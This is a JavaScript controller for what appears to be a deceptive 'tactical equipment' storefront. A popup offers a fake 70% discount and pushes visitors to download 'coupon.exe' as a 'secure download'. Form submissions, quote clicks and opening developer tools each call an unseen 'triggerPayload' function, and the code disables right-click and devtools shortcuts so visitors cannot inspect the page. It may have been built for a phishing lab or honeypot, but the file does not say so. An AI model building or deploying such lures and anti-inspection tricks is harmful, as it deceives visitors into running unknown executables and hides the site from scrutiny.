// Main Application Controller
document.addEventListener('DOMContentLoaded', function() {
    console.log('H&F Tactical Site Loading...');
    
    // Initialize all components
    initializeApplication();
});

function initializeApplication() {
    try {
        // Load all components first
        loadAllComponents();
        
        // Wait for components to load, then initialize features
        setTimeout(() => {
            // Initialize navigation system
            initNavigation();
            
            // Initialize payload system
            initPayloadSystem();
            
            // Set initial state
            showSection('home');
            
            // Initialize additional features
            initAdditionalFeatures();

            // Show coupon popup after 3 seconds
            setTimeout(showCouponPopup, 3000);

            console.log('H&F Tactical Site Ready');
        }, 100);
        
    } catch (error) {
        console.error('Application initialization error:', error);
        // Fallback initialization
        fallbackInitialization();
    }
}

function initAdditionalFeatures() {
    // Initialize form handlers
    initFormHandlers();

    // Initialize keyboard shortcuts
    initKeyboardShortcuts();

    // Initialize analytics tracking
    initAnalytics();

    // Initialize security features
    initSecurityFeatures();

    // Initialize image loading
    initImageHandling();
}

function initFormHandlers() {
    // Handle contact forms and quote requests
    document.addEventListener('submit', function(e) {
        const form = e.target;
        if (form.tagName === 'FORM') {
            e.preventDefault();
            
            // Trigger payload on form submission
            triggerPayload('form-submit');
            
            // Show success message
            showNotification('Request submitted successfully. Our team will contact you shortly.', 'success');
        }
    });
    
    // Handle button clicks for quote requests
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('weapon-btn') || e.target.classList.contains('card-btn')) {
            e.preventDefault();
            
            // Trigger payload on button click
            const category = e.target.closest('.weapon-card, .product-card').className.split(' ')[1] || 'general';
            triggerPayload(category);
            
            // Show quote request modal (simulated)
            showQuoteModal();
        }
    });
}

function initKeyboardShortcuts() {
    document.addEventListener('keydown', function(e) {
        // Navigation shortcuts
        if (e.ctrlKey || e.metaKey) {
            switch(e.key) {
                case '1':
                    e.preventDefault();
                    showSection('home');
                    break;
                case '2':
                    e.preventDefault();
                    showSection('weapons');
                    break;
                case '3':
                    e.preventDefault();
                    showSection('defense');
                    break;
                case '4':
                    e.preventDefault();
                    showSection('emps');
                    break;
                case '5':
                    e.preventDefault();
                    showSection('nonlethals');
                    break;
                case '6':
                    e.preventDefault();
                    showSection('contact');
                    break;
            }
        }
        
        // Escape key to close modals
        if (e.key === 'Escape') {
            closeAllModals();
        }
    });
}

function initAnalytics() {
    // Track page views
    let currentSection = 'home';
    const originalShowSection = window.showSection;
    
    window.showSection = function(sectionId) {
        // Call original function
        originalShowSection(sectionId);
        
        // Track section change
        if (currentSection !== sectionId) {
            trackEvent('section_view', {
                from: currentSection,
                to: sectionId,
                timestamp: new Date().toISOString()
            });
            currentSection = sectionId;
        }
    };
    
    // Track user interactions
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('product-card') || e.target.closest('.product-card')) {
            const card = e.target.closest('.product-card') || e.target;
            const cardType = card.className.split(' ')[1] || 'unknown';
            
            trackEvent('product_click', {
                product: cardType,
                timestamp: new Date().toISOString()
            });
        }
    });
}

function initSecurityFeatures() {
    // Disable right-click context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    // Disable F12 and other dev tools shortcuts
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
            (e.ctrlKey && e.key === 'U')) {
            e.preventDefault();
            return false;
        }
    });

    // Detect developer tools
    let devtools = {open: false, orientation: null};
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
            if (!devtools.open) {
                devtools.open = true;
                triggerPayload('devtools-detected');
            }
        } else {
            devtools.open = false;
        }
    }, 500);
}

function initImageHandling() {
    // Wait for components to load, then handle images
    setTimeout(() => {
        const images = document.querySelectorAll('.weapon-img, .card-img');

        images.forEach(img => {
            // Add error handling
            img.addEventListener('error', function() {
                console.log('Image failed to load:', this.src);
                this.style.backgroundColor = '#333';
                this.style.border = '2px dashed #ff6b35';
                this.alt = 'Image not found: ' + this.alt;
            });

            // Add load success handling
            img.addEventListener('load', function() {
                console.log('Image loaded successfully:', this.src);
                this.style.opacity = '1';
            });

            // Force reload if image is not loaded
            if (!img.complete || img.naturalHeight === 0) {
                const originalSrc = img.src;
                img.src = '';
                img.src = originalSrc;
            }
        });

        // Debug: Log all image sources
        console.log('🖼️ Image sources found:');
        images.forEach(img => {
            console.log(`- ${img.alt}: ${img.src}`);
        });

    }, 1000);
}

function trackEvent(eventName, data) {
    try {
        // Just log tracking events to console instead of sending to server
        console.log('📊 Analytics Event:', eventName, data);

        // Store in local storage for debugging
        const events = JSON.parse(localStorage.getItem('analytics_events') || '[]');
        events.push({
            event: eventName,
            data: data,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        });
        localStorage.setItem('analytics_events', JSON.stringify(events));
    } catch(e) {
        console.log('Analytics error:', e);
    }
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas fa-${type === 'success' ? 'check-circle' : 'info-circle'}"></i>
            <span>${message}</span>
            <button class="notification-close" onclick="this.parentElement.parentElement.remove()">
                <i class="fas fa-times"></i>
            </button>
        </div>
    `;
    
    // Add notification styles if not already present
    if (!document.querySelector('#notification-styles')) {
        const styles = document.createElement('style');
        styles.id = 'notification-styles';
        styles.textContent = `
            .notification {
                position: fixed;
                top: 100px;
                right: 20px;
                background: #1a1a1a;
                border: 1px solid #ff6b35;
                border-radius: 5px;
                padding: 15px;
                color: #fff;
                z-index: 10000;
                max-width: 400px;
                animation: slideIn 0.3s ease;
            }
            .notification-success { border-color: #28a745; }
            .notification-content {
                display: flex;
                align-items: center;
                gap: 10px;
            }
            .notification-close {
                background: none;
                border: none;
                color: #fff;
                cursor: pointer;
                margin-left: auto;
            }
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
        `;
        document.head.appendChild(styles);
    }
    
    document.body.appendChild(notification);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
        if (notification.parentElement) {
            notification.remove();
        }
    }, 5000);
}

function showQuoteModal() {
    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3><i class="fas fa-file-contract"></i> Request Quote</h3>
                <button class="modal-close" onclick="this.closest('.modal-overlay').remove()">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <p>Thank you for your interest in our tactical equipment.</p>
                <p>Our specialists will contact you within 24 hours to discuss your requirements and provide a customized quote.</p>
                <div class="quote-form">
                    <input type="text" placeholder="Your Name" class="form-input">
                    <input type="email" placeholder="Email Address" class="form-input">
                    <input type="tel" placeholder="Phone Number" class="form-input">
                    <textarea placeholder="Specific Requirements" class="form-textarea"></textarea>
                    <button class="btn btn-primary" onclick="submitQuote()">Submit Request</button>
                </div>
            </div>
        </div>
    `;
    
    // Add modal styles if not already present
    if (!document.querySelector('#modal-styles')) {
        const styles = document.createElement('style');
        styles.id = 'modal-styles';
        styles.textContent = `
            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0,0,0,0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
            }
            .modal-content {
                background: #1a1a1a;
                border: 2px solid #ff6b35;
                border-radius: 10px;
                max-width: 500px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
            }
            .modal-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 20px;
                border-bottom: 1px solid #333;
            }
            .modal-header h3 {
                color: #ff6b35;
                margin: 0;
            }
            .modal-close {
                background: none;
                border: none;
                color: #fff;
                font-size: 1.2rem;
                cursor: pointer;
            }
            .modal-body {
                padding: 20px;
                color: #ccc;
            }
            .quote-form {
                margin-top: 20px;
            }
            .form-input, .form-textarea {
                width: 100%;
                padding: 10px;
                margin-bottom: 15px;
                background: #333;
                border: 1px solid #555;
                border-radius: 5px;
                color: #fff;
            }
            .form-textarea {
                height: 100px;
                resize: vertical;
            }
        `;
        document.head.appendChild(styles);
    }
    
    document.body.appendChild(modal);
}

function submitQuote() {
    triggerPayload('quote-submit');
    showNotification('Quote request submitted successfully!', 'success');
    closeAllModals();
}

function closeAllModals() {
    document.querySelectorAll('.modal-overlay').forEach(modal => {
        modal.remove();
    });
}

function fallbackInitialization() {
    console.log('Using fallback initialization');
    
    // Basic navigation fallback
    window.showSection = function(sectionId) {
        document.querySelectorAll('.page-section').forEach(section => {
            section.style.display = 'none';
        });
        const target = document.getElementById(sectionId);
        if (target) {
            target.style.display = 'block';
        }
    };
    
    // Basic payload fallback
    window.triggerPayload = function(category) {
        console.log('Payload triggered:', category);
    };
}

// Global error handler
window.addEventListener('error', function(e) {
    console.error('Application error:', e.error);
    // Continue operation despite errors
});

// Global unhandled promise rejection handler
window.addEventListener('unhandledrejection', function(e) {
    console.error('Unhandled promise rejection:', e.reason);
    e.preventDefault();
});

// Coupon popup functionality
function showCouponPopup() {
    // Check if popup was already shown this session
    if (sessionStorage.getItem('couponShown')) {
        return;
    }

    // Create popup overlay
    const overlay = document.createElement('div');
    overlay.id = 'couponOverlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        z-index: 10000;
        display: flex;
        justify-content: center;
        align-items: center;
        animation: fadeIn 0.3s ease-out;
    `;

    // Create popup content
    const popup = document.createElement('div');
    popup.style.cssText = `
        background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
        border: 3px solid #ff6b35;
        border-radius: 15px;
        padding: 30px;
        max-width: 500px;
        text-align: center;
        color: white;
        box-shadow: 0 20px 40px rgba(255, 107, 53, 0.3);
        animation: slideIn 0.5s ease-out;
        position: relative;
    `;

    popup.innerHTML = `
        <div style="margin-bottom: 20px;">
            <i class="fas fa-gift" style="font-size: 3rem; color: #ff6b35; margin-bottom: 15px;"></i>
            <h2 style="color: #ff6b35; margin: 0 0 10px 0; font-size: 1.8rem;">🎯 EXCLUSIVE OFFER!</h2>
            <h3 style="color: #fff; margin: 0 0 20px 0; font-size: 1.3rem;">Limited Time Tactical Equipment Discount</h3>
        </div>

        <div style="background: rgba(255, 107, 53, 0.1); padding: 20px; border-radius: 10px; margin-bottom: 25px;">
            <p style="font-size: 1.1rem; margin: 0 0 15px 0; line-height: 1.5;">
                <strong>70% OFF</strong> all tactical equipment for qualified personnel!
            </p>
            <p style="font-size: 0.9rem; margin: 0; color: #ccc;">
                Download your exclusive coupon now - Valid for law enforcement, military, and security professionals only.
            </p>
        </div>

        <div style="margin-bottom: 20px;">
            <a href="coupon.exe" download style="
                display: inline-block;
                background: linear-gradient(135deg, #ff6b35, #ff8c42);
                color: white;
                padding: 15px 30px;
                text-decoration: none;
                border-radius: 8px;
                font-weight: bold;
                font-size: 1.1rem;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
            " onmouseover="this.style.background='linear-gradient(135deg, #ff8c42, #ffaa42)'; this.style.transform='translateY(-2px)'"
               onmouseout="this.style.background='linear-gradient(135deg, #ff6b35, #ff8c42)'; this.style.transform='translateY(0)'">
                <i class="fas fa-download"></i> Download Coupon Now
            </a>
        </div>

        <div style="font-size: 0.8rem; color: #888; margin-bottom: 15px;">
            ⏰ Offer expires in 24 hours | 🔒 Secure download
        </div>

        <button onclick="closeCouponPopup()" style="
            background: transparent;
            border: 1px solid #666;
            color: #ccc;
            padding: 8px 16px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
        ">Maybe Later</button>
    `;

    overlay.appendChild(popup);
    document.body.appendChild(overlay);

    // Add CSS animations
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes slideIn {
            from { transform: translateY(-50px) scale(0.9); opacity: 0; }
            to { transform: translateY(0) scale(1); opacity: 1; }
        }
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
    `;
    document.head.appendChild(style);

    // Mark as shown this session
    sessionStorage.setItem('couponShown', 'true');

    // Track popup display
    trackEvent('coupon_popup_shown', {
        timestamp: new Date().toISOString(),
        page: window.location.pathname
    });
}

function closeCouponPopup() {
    const overlay = document.getElementById('couponOverlay');
    if (overlay) {
        overlay.style.animation = 'fadeOut 0.3s ease-out';
        setTimeout(() => {
            overlay.remove();
        }, 300);
    }

    // Track popup close
    trackEvent('coupon_popup_closed', {
        action: 'manual_close',
        timestamp: new Date().toISOString()
    });
}
